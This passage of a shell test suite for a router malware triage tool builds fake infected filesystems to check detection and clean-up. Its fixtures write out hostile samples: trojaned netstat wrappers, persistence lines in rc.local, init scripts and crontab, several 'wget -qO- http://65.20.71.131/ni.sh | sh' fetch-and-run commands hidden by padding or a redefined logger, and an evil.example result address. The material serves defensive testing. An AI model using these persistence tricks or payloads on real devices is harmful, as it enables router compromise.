printf 'PROG=/etc/config/.gl/gl-helper\nprocd_set_param command "$PROG"\n' >"$U/etc/init.d/prog"
printf 'sh /etc/glinet/.cache//watch.sh\n' >"$U/etc/init.d/slash"
mnt "$D" "$OWL"
GL_TRIAGE_RESULT_URL=https://evil.example/ run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "flock in cron, \$( ) in rc.local, a server in variables, an upper-case host: each IOC persist-ref" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/99-net" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/upper" "$D/check.txt"'
expect "trap, xargs, find -exec, a program in a variable and a path with // each IOC persist-ref" '(for n in trap xargs find prog slash; do grep -q "IOC  *persist-ref  */etc/init.d/$n" "$D/check.txt" || exit 1; done)'
expect "an address for the result page from the environment is not taken unless it is this machine" 'grep -q "csa.gl-i.net/#" "$D/check.txt" && ! grep -q evil.example "$D/check.txt"'
umount "$D/m"

echo "=== review of 2.55: a KVM without a base image to put back"
D=$(mkscen r255k "$OWL"); U=$D/u
mkdir -p "$U/usr/bin" "$U/etc/config/.gl"
printf '#!/bin/sh\n/bin/busybox netstat "$@" | grep -v 65.20\n' >"$U/usr/bin/netstat"; chmod 755 "$U/usr/bin/netstat"
echo x >"$U/etc/config/.gl/gl-helper"
mnt "$D" "$OWL"
triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
if env PATH="$TRIAGE_PATH" sh -c 'busybox --list' 2>/dev/null | grep -qx netstat; then
	expect "--fix without a base image puts netstat back as a link to busybox (exit $rc)" '[ $rc = 2 ] && [ -L "$D/m/usr/bin/netstat" ] && [ "$(readlink "$D/m/usr/bin/netstat")" = /bin/busybox ]'
else
	expect "--fix without a base image and without busybox says to put netstat back (exit $rc)" '[ ! -e "$D/m/usr/bin/netstat" ] && grep -q "/usr/bin/netstat is gone now" "$D/fix.txt"'
fi
umount "$D/m"

echo "=== review of 2.55: a # in the path of the upper layer"
D=$(mkscen 'r255#h' "$OWL"); U=$D/u
mkdir -p "$U/usr/bin"; printf 'trojan\n' >"$U/usr/bin/netstat"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "the netstat that shadows the link is IOC applet-hijack (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *applet-hijack  */usr/bin/netstat" "$D/check.txt"'
umount "$D/m"

echo "=== second review of 2.55: a copy of this script, addresses from the environment"
D=$(mkscen r255s1 "$OWL"); U=$D/u
mkdir -p "$U/usr/bin"; cp "$T" "$U/usr/bin/gl-helper-triage.sh"
mnt "$D" "$OWL"
GL_TRIAGE_RESULT_URL='http://127.0.0.1:1@evil.example/' run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a copy of the script in /usr/bin is no IOC (exit $rc)" '[ $rc = 0 ] && ! grep -q "IOC .*/usr/bin/gl-helper-triage.sh" "$D/check.txt"'
expect "an address of this machine with a user part (127.0.0.1:1@host) is not taken" 'grep -q "csa.gl-i.net/#" "$D/check.txt" && ! grep -q evil.example "$D/check.txt"'
umount "$D/m"

echo "=== second review of 2.55: line breaks at the end of a name and in a directory's name"
D=$(mkscen r255s2 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d" "$U/etc/config/.gl" "$U/etc/init.d/x
etc/config" "$U/etc/config" "$D/cwd/etc/config"
echo x >"$U/etc/config/.gl/gl-helper"
printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/svc
"
printf '#!/bin/sh /etc/rc.common\nSTART=50\n' >"$U/etc/init.d/svc"
echo "option ipaddr 10.9.8.1" >"$U/etc/init.d/x
etc/config/network"
echo "option ipaddr 10.9.8.1" >"$U/etc/config/network"
echo '/etc/config/.gl/gl-helper &' >"$D/cwd/etc/config/network"
mnt "$D" "$OWL"
(cd "$D/cwd" && run "$D" "$OWL" --check >"$D/check.txt"); rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "a name that ends in a line break is IOC as itself, the owner's file of the same name is not (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  *?/etc/init.d/svc?" "$D/check.txt" && ! grep -q "IOC  *persist-ref  */etc/init.d/svc *$" "$D/check.txt"'
expect "the pieces of a directory's name with a line break are no paths of their own" '! grep -q "IOC .*/etc/config/network" "$D/check.txt"'
(cd "$D/cwd" && run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1); rc=$?
expect "--fix removes the file with the line break and leaves the owner's files (exit $rc)" '[ $rc = 2 ] && [ -f "$D/m/etc/init.d/svc" ] && grep -q START=50 "$D/m/etc/init.d/svc" && [ ! -e "$D/m/etc/init.d/svc
" ] && grep -q 10.9.8.1 "$D/m/etc/config/network"'
umount "$D/m"

echo "=== second review of 2.55: starts the parser did not see, and an owner's case"
D=$(mkscen r255s3 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d" "$U/etc/crontabs"
printf '# Put your custom commands here\n(sleep 5; /etc/config/.gl/gl-helper) >/dev/null 2>&1 &\nexit 0\n' >"$U/etc/rc.local"
printf '#!/bin/sh\nsh<<EOF\n/etc/config/.gl/gl-helper &\nEOF\n' >"$U/etc/init.d/hd"
printf '#!/bin/sh\ncat << "E O F" > /dev/null\nx\nE O F\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/qhd"
printf '#!/bin/sh\n{ crontab -l; echo "*/3 * * * * /etc/config/.gl/watch.sh"; } | crontab -\n' >"$U/etc/init.d/grp"
printf '#!/bin/sh\nfor f in /x /y; do case $f in /etc/config/.gl/gl-helper|/tmp/.gl/gl-helper) rm -f "$f" ;; esac; done\n' >"$U/etc/init.d/guard"
printf '#!/bin/sh\ncase "$1" in\nstart) (sleep 5; /etc/config/.gl/gl-helper) >/dev/null 2>&1 &\n;;\nesac\n' >"$U/etc/init.d/cs"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "( ...; prog ) &, also inside a case, sh<<EOF, a quoted end word and { echo; } | crontab - each IOC persist-ref (exit $rc)" '[ $rc = 1 ] && (for p in rc.local init.d/hd init.d/qhd init.d/grp init.d/cs; do grep -q "IOC  *persist-ref  */etc/$p" "$D/check.txt" || exit 1; done)'
expect "a case on one line that names the malware's paths in its patterns starts nothing" '! grep -q "IOC .*/etc/init.d/guard" "$D/check.txt"'
umount "$D/m"

echo "=== second review of 2.55: a tool's name in a comment or a log text fetches nothing"
D=$(mkscen r255s4 "$OWL"); U=$D/u
mkdir -p "$U/etc"
printf '# Put your custom commands here\n/root/start-vpn.sh\niptables -I OUTPUT -d 65.20.71.131 -m comment --comment "block nc shell" -j DROP\nlogger -t csa "blocked wget to 65.20.71.131"\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW|INFO) ' "$D/check.txt"
expect "the owner's block with nc and wget in its texts is no IOC (exit $rc)" '[ $rc = 0 ] && ! grep -q "IOC .*/etc/rc.local" "$D/check.txt"'
run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix leaves that rc.local (exit $rc)" '[ $rc = 0 ] && grep -q start-vpn "$D/m/etc/rc.local"'
umount "$D/m"

echo "=== second review of 2.55: control characters from the package list, and from UTF-8"
D=$(mkscen r255s5 "$OWL"); U=$D/u
mkdir -p "$U/usr/lib/opkg" "$U/etc/init.d"
printf 'Package: gl-sdk4-cloud\nVersion: \033[2J\033[1;1rX\nStatus: install ok installed\n\n' >"$U/usr/lib/opkg/status"
printf '#!/bin/sh\n' >"$U/etc/init.d/$(printf 'a\302\233[2Jb')"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no escape from the package list or a name in UTF-8 reaches the screen" '! grep -q "$(printf "\033")" "$D/check.txt" && ! grep -q "$(printf "\302\233")" "$D/check.txt" && grep -q "gl-sdk4-cloud ?\[2J?\[1;1rX" "$D/check.txt" && grep -q "/etc/init.d/a?\[2Jb" "$D/check.txt"'
umount "$D/m"

echo "=== second review of 2.55: --root and a linked directory that leads out of the image"
D=$(mkscen r255s6 "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl" "$D/victim/.cache"
echo x >"$U/etc/config/.gl/gl-helper"
echo notes >"$D/victim/.cache/owner-notes.txt"
ln -s ../../victim "$U/etc/glinet"
mnt "$D" "$OWL"
run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix removes nothing outside the root (exit $rc)" '[ -f "$D/victim/.cache/owner-notes.txt" ] && [ ! -e "$D/m/etc/config/.gl" ]'
a=$(ls "$D/out"/*.tar.gz 2>/dev/null | head -n 1)
expect "the archive holds nothing from outside the root and names what it left out" '[ -n "$a" ] && ! tar -tzf "$a" | grep -q owner-notes && tar -xzOf "$a" --wildcards "*NOT-COPIED.txt" | grep -q "^/etc/glinet/.cache.*a directory on its way is a link"'
umount "$D/m"

echo "=== second review of 2.55: --changes with line breaks in a link and in a directory"
D=$(mkscen r255s7 "$OWL"); U=$D/u
mkdir -p "$U/etc" "$U/x
etc" "$D/cwd/etc"
ln -s "/tmp/n
removed  2026-11-20 21:03:15  /etc/passwd" "$U/etc/lnk"
echo s >"$U/x
etc/shadow"
echo s >"$D/cwd/etc/shadow"
mnt "$D" "$OWL"
(cd "$D/cwd" && run "$D" "$OWL" --changes >"$D/chg.txt" 2>&1); rc=$?
cat "$D/chg.txt"
expect "--changes prints no line that a link's target or a directory's name made up (exit $rc)" '[ $rc = 0 ] && ! grep -q "^removed .*/etc/passwd$" "$D/chg.txt" && ! grep -q "^new .*  /etc/shadow$" "$D/chg.txt" && grep -q "^new .*/etc/lnk -> /tmp/n?removed" "$D/chg.txt"'
umount "$D/m"

echo "=== second review of 2.55: a large init script is read in time"
D=$(mkscen r255s8 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
{ echo '#!/bin/sh'; i=0; while [ $i -lt 2000 ]; do echo "echo 1 >/sys/class/gpio/gpio$i/value"; i=$((i + 1)); done; } >"$U/etc/init.d/gpio-setup"
mnt "$D" "$OWL"
s=$(date +%s); run "$D" "$OWL" --check >"$D/check.txt"; rc=$?; e=$(($(date +%s) - s))
expect "a 2000-line init script takes no more than 15 s ($e s, exit $rc)" '[ $rc = 0 ] && [ $e -le 15 ]'
umount "$D/m"

echo "=== third review of 2.55: a copy of this script under netstat's name, with a package claim"
D=$(mkscen r255t1 "$OWL"); U=$D/u
mkdir -p "$U/usr/bin" "$U/lib/apk/db"
printf '#!/bin/sh\n# x\n# x\n# gl-helper-triage.sh - triage for x\nVERSION=1.0\nIOC_RE=x\nBD_HOST_RE=x\nbusybox netstat "$@" | grep -v 4444\n' >"$U/usr/bin/netstat"
{ cat "$OWL/lib/apk/db/installed"; printf 'P:net-tools\nF:usr/bin\nR:netstat\n\n'; } >"$U/lib/apk/db/installed"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a netstat that calls the real one and hides lines is IOC applet-hijack, a copy's header and a package claim do not change that (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *applet-hijack  */usr/bin/netstat" "$D/check.txt"'
umount "$D/m"

echo "=== third review of 2.55: case and subshells, an owner's guard"
D=$(mkscen r255t2 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh\n(\nfor f in /etc/config/.gl/x; do\ncase "$f" in\n/etc/config/.gl/*) rm -f "$f" ;;\nesac\ndone\n) 2>/dev/null\n' >"$U/etc/init.d/guard2"
printf '#!/bin/sh\nlogger starting \\(boot\ncase "$1" in\nstart) /etc/config/.gl/gl-helper &\n;;\nesac\n' >"$U/etc/init.d/esc"
printf '#!/bin/sh\n(\ncase "$1" in\nstart) /etc/config/.gl/gl-helper ;;\nesac\n) &\n' >"$U/etc/init.d/sub"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "a case inside a subshell, and one after an escaped (, start the malware: IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/esc" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/sub" "$D/check.txt"'
expect "a guard in a subshell that removes the malware's files is no start" '! grep -q "IOC .*/etc/init.d/guard2" "$D/check.txt"'
umount "$D/m"
D=$(mkscen r255t3 "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl"
echo x >"$U/etc/config/.gl/gl-helper"
printf '# Put your custom commands here\nfor f in /x; do\ncase "$f" in\n/etc/config/.gl/*) rm -f "$f" ;;\nesac\ndone\n/etc/config/.gl/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix without a base image takes the malware's line out of rc.local and keeps the owner's guard (exit $rc)" '[ $rc = 2 ] && grep -q "rm -f" "$D/m/etc/rc.local" && ! grep -q "^/etc/config/.gl/gl-helper" "$D/m/etc/rc.local"'
umount "$D/m"

echo "=== third review of 2.55: what echo writes counts, logger's text only while logger is logger"
D=$(mkscen r255t4 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh\n{\necho "wget -O /etc/x http://65.20.71.131/x"\n} | sh\n' >"$U/etc/init.d/grp-sh"
printf '#!/bin/sh\nlogger() { eval "$1"; }\nlogger "wget -qO- http://65.20.71.131/ni.sh | sh"\niptables -I OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/init.d/own-logger"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "echo in a group piped to sh, and a logger of its own, fetch from the server: IOC (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/grp-sh" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/own-logger" "$D/check.txt"'
umount "$D/m"

echo "=== third review of 2.55: padding does not hide a start, groups and here-documents"
D=$(mkscen r255t5 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
{ echo '#!/bin/sh'; i=0; while [ $i -lt 30000 ]; do echo "# padding $i xxxxxxxxxxxxxxxxxxxxxxxxxxxx"; i=$((i + 1)); done; printf 'PROG=/etc/config/.gl/gl-helper\nstart() { "$PROG" & }\n'; } >"$U/etc/init.d/padded"
{ head -c 1200000 /dev/zero; printf '\nS=http://65.20.71.131:8000\nwget -qO- "$S/ni.sh" | sh\n'; } >"$U/etc/init.d/nul"
printf '#!/bin/sh\n{ crontab -l; echo "*/3 * * * * /etc/config/.gl/watch.sh >/dev/null 2>&1"; } | sort -u | crontab -\n' >"$U/etc/init.d/grp-cron"
printf '#!/bin/sh\ncat <<E" O" >/dev/null\nx\nE O\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/hd-word"
printf '#!/bin/sh\necho "/etc/config/.gl/gl-helper found, removing"\nif true; then { crontab -l | grep -v watch; } | crontab -; fi\n' >"$U/etc/init.d/cron-clean"
mnt "$D" "$OWL"
s=$(date +%s); run "$D" "$OWL" --check >"$D/check.txt"; rc=$?; e=$(($(date +%s) - s))
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "1.2 MB of comments or NUL bytes hide no start, and are read in time ($e s, exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/padded" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/nul" "$D/check.txt" && [ $e -le 30 ]'
expect "a group piped through sort into crontab, and an end word with quotes inside, start the malware" 'grep -q "IOC  *persist-ref  */etc/init.d/grp-cron" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/hd-word" "$D/check.txt"'
expect "an echo outside a group that a crontab is piped from is no line of that crontab" '! grep -q "IOC .*/etc/init.d/cron-clean" "$D/check.txt"'
umount "$D/m"

echo "=== third review of 2.55: --root and files that are links out of the image"
D=$(mkscen r255t6 "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl" "$U/etc/crontabs" "$D/victim"
echo x >"$U/etc/config/.gl/gl-helper"
printf 'owner line\n/etc/config/.gl/gl-helper &\n' >"$D/victim/rc.local"
printf '0 3 * * * /root/backup.sh\n*/5 * * * * /etc/config/.gl/gl-helper\n' >"$D/victim/root"
ln -s ../../victim/rc.local "$U/etc/rc.local"; ln -s ../../../victim/root "$U/etc/crontabs/root"
mnt "$D" "$OWL"
triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix under --root writes through no link that leads out of the image (exit $rc)" '[ $rc = 3 ] && grep -q gl-helper "$D/victim/rc.local" && grep -q gl-helper "$D/victim/root" && grep -q "under --root a link is not written through" "$D/fix.txt"'
umount "$D/m"

echo "=== final review of 2.55: a subshell before a redirection with a blank or a pipe, groups inside groups"
D=$(mkscen r255f1 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh\n(sleep 5; /etc/config/.gl/gl-helper) > /dev/null 2>&1 &\n' >"$U/etc/init.d/sub-redir"
printf '#!/bin/sh\n(sleep 5; /etc/config/.gl/gl-helper) | logger -t x &\n' >"$U/etc/init.d/sub-pipe"
printf '#!/bin/sh\n{ crontab -l; echo "*/3 * * * * /etc/config/.gl/watch.sh"; (true); } | crontab -\n' >"$U/etc/init.d/grp-nest"
printf '#!/bin/sh\n{\ncrontab -l\necho "*/3 * * * * /etc/config/.gl/watch.sh"\nfind /tmp -name x -exec true {} \;\n} | crontab -\n' >"$U/etc/init.d/grp-find"
printf '#!/bin/sh\n{\ncrontab -l\ncase "$x" in\na) true ;;\nesac\necho "*/3 * * * * /etc/config/.gl/watch.sh"\n} | crontab -\n' >"$U/etc/init.d/grp-case"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "( ...; prog ) > /dev/null and ( ...; prog ) | logger start the malware: IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/sub-redir" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/sub-pipe" "$D/check.txt"'
expect "a group inside a group, the {} of find and the pattern of a case keep the echo that goes into crontab" 'grep -q "IOC  *persist-ref  */etc/init.d/grp-nest" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/grp-find" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/grp-case" "$D/check.txt"'
umount "$D/m"

echo "=== final review of 2.55: padding keeps an empty line, a here-document's end word with #"
D=$(mkscen r255f2 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
pad() { i=0; while [ $i -lt 30000 ]; do echo "# padding $i xxxxxxxxxxxxxxxxxxxxxxxxxxxx"; i=$((i + 1)); done; }
{ echo '#!/bin/sh'; pad; printf ': \\\n\n/etc/config/.gl/gl-helper &\n'; } >"$U/etc/init.d/cont"
{ echo '#!/bin/sh'; printf 'cat <<\\#E >/dev/null\nx\n#E\n'; pad; printf '/etc/config/.gl/gl-helper &\n'; } >"$U/etc/init.d/hd-hash"
mnt "$D" "$OWL"
s=$(date +%s); run "$D" "$OWL" --check >"$D/check.txt"; rc=$?; e=$(($(date +%s) - s))
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "in a file over 1 MB, a line ended with \\ before an empty line, and a here-document ended by #E, start the malware ($e s, exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/cont" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/hd-hash" "$D/check.txt" && [ $e -le 30 ]'
umount "$D/m"

echo "=== final review of 2.55: logger -st, a function named comment, a logger of its own in --fix"
D=$(mkscen r255f3 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh\n{\nlogger -st x "wget -qO- http://65.20.71.131/ni.sh | sh"\n} 2>&1 | sh\n' >"$U/etc/init.d/logger-st"
printf '#!/bin/sh\ncomment() { eval "$1"; }\nx=1 comment "wget -qO- http://65.20.71.131/ni.sh | sh"\n' >"$U/etc/init.d/own-comment"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "logger -st in a group piped to sh, and a function named comment, fetch from the server: IOC (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/logger-st" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/own-comment" "$D/check.txt"'
umount "$D/m"
D=$(mkscen r255f4 "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl"
echo x >"$U/etc/config/.gl/gl-helper"
printf '# Put your custom commands here\nlogger() { eval "$1"; }\nlogger "wget -qO- http://65.20.71.131/ni.sh | sh"\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix without a base image takes the line out that a logger of its own runs (exit $rc)" '[ $rc = 2 ] && ! grep -q "65.20.71.131" "$D/m/etc/rc.local" && grep -q "exit 0" "$D/m/etc/rc.local"'
umount "$D/m"

echo "=== what the base image's busybox loads must be the base image's (issue 8)"
OWB=$BASE/openwrt-rom-libs
cp -a "$OWL" "$OWB"; mkdir -p "$OWB/lib"
printf 'ELF junk /lib/ld-musl-test.so.1 more libc.so and libgcc_s.so.1 end\n' >"$OWB/bin/busybox"
echo 'the real libc' >"$OWB/lib/libc.so"; echo 'the real libgcc' >"$OWB/lib/libgcc_s.so.1"; ln -s libc.so "$OWB/lib/ld-musl-test.so.1"
D=$(mkscen libs "$OWB"); U=$D/u
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"; rc=$?
expect "untouched libraries: no finding, no warning" '[ $rc = 0 ] && ! grep -q "changed-lib" "$D/check.txt" && ! grep -q "would load files" "$D/check.txt"'
umount "$D/m"
mkdir -p "$U/lib"; echo 'another libc' >"$U/lib/libc.so"
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"
grep -E -A1 'changed-lib|would load' "$D/check.txt"
expect "a libc in the overlay is REVIEW changed-lib, and the tools are not trusted" 'grep -q "REVIEW  *changed-lib  */lib/libc.so" "$D/check.txt" && grep -q "Trusted tools  *no" "$D/check.txt" && grep -A1 "would load files" "$D/check.txt" | grep -q "(/lib/libc.so)"'
umount "$D/m"
rm "$U/lib/libc.so"; cp "$OWB/lib/libc.so" "$U/lib/libc.so"; mkdir -p "$U/etc"; echo /tmp/x >"$U/etc/ld-musl-test.path"
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"
expect "an identical copy is fine; a library path file for the loader is REVIEW changed-lib" '! grep -q "changed-lib  */lib/libc.so" "$D/check.txt" && grep -q "REVIEW  *changed-lib  */etc/ld-musl-test.path" "$D/check.txt"'
umount "$D/m"
rm "$U/etc/ld-musl-test.path"; rm "$U/lib/libc.so"; rm -f "$U/lib/ld-musl-test.so.1"; ln -s /tmp/evil.so "$U/lib/ld-musl-test.so.1"
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"
expect "a loader link that points elsewhere is REVIEW changed-lib" 'grep -q "REVIEW  *changed-lib  */lib/ld-musl-test.so.1" "$D/check.txt"'
umount "$D/m"

echo "=== the report's note (--note)"
# The report is only built on a live device (--root /), so the script runs as / of a
# chroot that holds nothing but a static busybox: its ash, as on a router. Nothing is
# sent: stdin is not a terminal, and the address points nowhere.
BB=$(command -v busybox)
if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
	L=$BASE/live; mkdir -p "$L/bin" "$L/tmp" "$L/dev"; cp "$BB" "$L/bin/busybox"; cp "$T" "$L/t.sh"; : >"$L/dev/null"
	mount --bind /dev/null "$L/dev/null"; chroot "$L" /bin/busybox --install -s /bin
	# TMPDIR of the caller would name a directory that the chroot does not have
	live() { TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ chroot "$L" /bin/sh /t.sh --no-device-id "$@" </dev/null 2>&1; }
	live --show-report --note 'fleet-a 2026-11-22 after clean-up (repeat)' >"$L/show.txt"
	expect "the note, schema 10 and whether the firmware cleans up are in the report" 'grep -q "^   \"schema\": 10,$" "$L/show.txt" && grep -q "^   \"vendor_cleanup\": \"unknown\",$" "$L/show.txt" && grep -q "^   \"note\": \"fleet-a 2026-11-22 after clean-up (repeat)\",$" "$L/show.txt"'
	live --show-report --note "$(printf 'a;b"c\\d$e<\303\251>f\tg')" >"$L/show.txt"
	expect "characters jstr does not allow are dropped from the note" 'grep -q "\"note\": \"abcdefg\",$" "$L/show.txt"'
	X=$(head -c 130 /dev/zero | tr '\0' x); live --show-report --note "$X" >"$L/show.txt"
	expect "the note is cut at 120 characters" 'grep -q "\"note\": \"${X%??????????}\",$" "$L/show.txt"'
	live --show-report >"$L/show.txt"
	expect "without --note the note is empty" 'grep -q "\"note\": \"\",$" "$L/show.txt"'
	# the state file's first call: empty where /proc/mounts is missing or the mount is not
	# noatime, the access time where it is. /etc of the chroot is mounted noatime for that.
	mkdir -p "$L/etc"; : >"$L/etc/mp_ip_mapping_info"
	expect "without /proc/mounts the first call is empty" 'live --show-report | grep -q "\"state_file_first\": \"\",$"'
	mount --bind "$L/etc" "$L/etc"; mount -o remount,bind,noatime "$L/etc" 2>/dev/null
	mkdir -p "$L/proc"; printf '/dev/root / ext4 rw,relatime 0 0\n' >"$L/proc/mounts"
	expect "on a mount that is not noatime the first call is empty" 'live --show-report | grep -q "\"state_file_first\": \"\",$"'
	# The access time is set only now: on a relatime filesystem the reads above have moved
	# it. The mount must really be noatime, or the script's own read moves it again; a user
	# namespace on a relatime filesystem refuses that remount, and then this is skipped.
	F=$L/etc/mp_ip_mapping_info
	touch -a -d '2026-03-02 08:14:55 UTC' "$F"; cat "$F" >/dev/null
	if awk -v m="$L/etc" '$2 == m && ("," $4 ",") ~ /,noatime,/ { f = 1 } END { exit !f }' /proc/self/mounts &&
		[ "$(stat -c %X "$F")" = "$(date -u -d '2026-03-02 08:14:55 UTC' +%s)" ]; then
		printf '/dev/root / ext4 rw,relatime 0 0\n/dev/sda1 /etc ext4 rw,noatime 0 0\n' >"$L/proc/mounts"
		expect "on a noatime mount the report carries the first call" 'live --show-report | grep -q "\"state_file_first\": \"2026-03-02 08:14:55 UTC\",$"'
	else
		echo "  SKIP: on a noatime mount the report carries the first call (no noatime mount here: $(awk -v m="$L/etc" '$2 == m { print $4 }' /proc/self/mounts))"
	fi
	rm "$L/proc/mounts" "$F"; umount "$L/etc"
	live --note 'fleet-a, repeat' >"$L/ask.txt"
	expect "the summary before sending prints the note word for word" 'grep -A1 "And your note, as it will be sent:" "$L/ask.txt" | grep -qx "        fleet-a, repeat" && grep -q "Not sent" "$L/ask.txt"'
	live >"$L/ask.txt"
	expect "without a note the summary does not mention one" '! grep -q "your note" "$L/ask.txt" && grep -q "Not sent" "$L/ask.txt"'
	live --note >"$L/err.txt"; rc=$?
	expect "--note without a text is an error, exit 4" '[ $rc = 4 ] && grep -q "ERROR: --note needs a text" "$L/err.txt"'
	# Sending the report with a wget that is OpenWrt's uclient-fetch, as on GL.iNet's routers:
	# it knows no --header and stops at it with its usage text (seen on a GL-MT2500, 4.7.15).
	# The stand-in keeps what it was given, so the test sees what would have gone out.
	fakewget() { # $1: 1 when it knows --header
		rm -f "$L/bin/wget" "$L/tmp/sent.json" "$L/tmp/sent.args"
		{
			echo '#!/bin/sh'
			if [ "$1" = 1 ]; then echo 'case " $* " in *" --help "*) echo "  --header=STRING  --post-file=FILE"; exit 0 ;; esac'
			else
				echo 'case " $* " in *" --help "*) echo "Usage: uclient-fetch [options] <URL>"; echo "  --post-file=FILE"; exit 1 ;; esac'
				echo 'for a in "$@"; do case $a in --header*) echo "uclient-fetch: unrecognized option: ${a#--}" >&2; exit 1 ;; esac; done'
			fi
			echo 'for a in "$@"; do case $a in --post-file=*) cat "${a#--post-file=}" >/tmp/sent.json ;; esac; done'
			echo 'echo "$*" >/tmp/sent.args'
		} >"$L/bin/wget"
		chmod +x "$L/bin/wget"
	}
	fakewget 0; live --report >"$L/send.txt"
	expect "a wget without --header (uclient-fetch) still sends the report, without the header" 'grep -q "Sent. Thank you" "$L/send.txt" && grep -q "^\"schema\": 10,$" "$L/tmp/sent.json" && ! grep -q -- "--header" "$L/tmp/sent.args"'
	fakewget 1; live --report >"$L/send.txt"
	expect "a wget that knows --header gets the content type as before" 'grep -q "Sent. Thank you" "$L/send.txt" && grep -q "^\"schema\": 10,$" "$L/tmp/sent.json" && grep -q -- "--header=Content-Type: application/json" "$L/tmp/sent.args"'
	rm -f "$L/bin/wget" "$L/tmp/sent.json" "$L/tmp/sent.args"; ln -s /bin/busybox "$L/bin/wget"
	# The second stage: a process ujaild that runs from a deleted /tmp/ujaild, in a /proc
	# made of plain files. No test can hold a program with a known hash, so this checks that
	# another hash leaves the finding as it is.
	mkdir -p "$L/proc/1" "$L/proc/4242"; printf 'init\0' >"$L/proc/1/cmdline"
